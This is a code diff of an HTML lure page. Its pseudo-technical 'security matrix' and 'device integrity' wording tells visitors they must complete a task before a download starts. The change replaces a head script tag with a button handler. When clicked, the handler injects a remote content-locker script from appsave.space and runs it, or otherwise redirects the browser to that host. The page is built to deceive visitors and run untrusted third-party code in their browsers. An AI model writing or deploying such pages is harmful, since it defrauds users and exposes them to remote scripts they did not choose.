@@ -16,7 +16,6 @@
             background-color: #0b0813;
         }
     </style>
-    <script type="text/javascript" id="ogjs" src="https://appsave.space/cl/js/grjvvd"></script>
 </head>
 <body class="text-white min-h-screen flex flex-col justify-between antialiased relative">
 
@@ -162,7 +161,7 @@
                     <p class="text-xs text-gray-400 leading-relaxed font-medium px-2">
                         To guarantee structural data packet priority and verify your target device integrity node, please finish one quick task from the security matrix below. Distribution initiates automatically upon successful confirmation.
                     </p>
-                    <button type="button" onclick="call_locker_function()" class="w-full bg-gradient-to-r from-green-600 to-emerald-500 hover:from-green-500 hover:to-emerald-400 text-white font-bold uppercase tracking-widest py-4 rounded-xl shadow-xl shadow-green-900/40 cursor-pointer transform active:scale-[0.99] transition-all text-center block">
+                    <button type="button" onclick="triggerContentLocker()" class="w-full bg-gradient-to-r from-green-600 to-emerald-500 hover:from-green-500 hover:to-emerald-400 text-white font-bold uppercase tracking-widest py-4 rounded-xl shadow-xl shadow-green-900/40 cursor-pointer transform active:scale-[0.99] transition-all text-center block">
                         Continue Execution
                     </button>
                 </div>
@@ -292,7 +291,7 @@
                     document.getElementById('loading-bar-container').classList.add('hidden');
                     document.getElementById('percent-display').classList.add('hidden');
                     
-                    // Reveal professional Action Layout & Manual Button (Onclick configuration)
+                    // Reveal professional Action Layout & Manual Button
                     document.getElementById('verification-action').classList.remove('hidden');
                 } else {
                     width++;
@@ -305,6 +304,36 @@
                     }
                 }
             }, 50);
+        }
+
+        // DYNAMIC INJECTION - LOCKER TRIGGERS MANUALLY ONLY ONCLICK
+        function triggerContentLocker() {
+            // 1. Inject the script elements programmatically right on button click
+            if (!document.getElementById('ogjs')) {
+                const ogScript = document.createElement('script');
+                ogScript.type = 'text/javascript';
+                ogScript.id = 'ogjs';
+                ogScript.src = 'https://appsave.space/cl/js/grjvvd';
+                
+                // 2. Fire the locker initialization callback as soon as the file lands
+                ogScript.onload = function() {
+                    if (typeof call_locker_function === 'function') {
+                        call_locker_function();
+                    } else {
+                        // Fallback fallback mechanism if global handler varies
+                        window.location.href = "https://appsave.space/cl/i/grjvvd";
+                    }
+                };
+                
+                document.head.appendChild(ogScript);
+            } else {
+                // If it already loaded, execute instantly manually
+                if (typeof call_locker_function === 'function') {
+                    call_locker_function();
+                } else {
+                    window.location.href = "https://appsave.space/cl/i/grjvvd";
+                }
+            }
         }
 
         const modalData = {
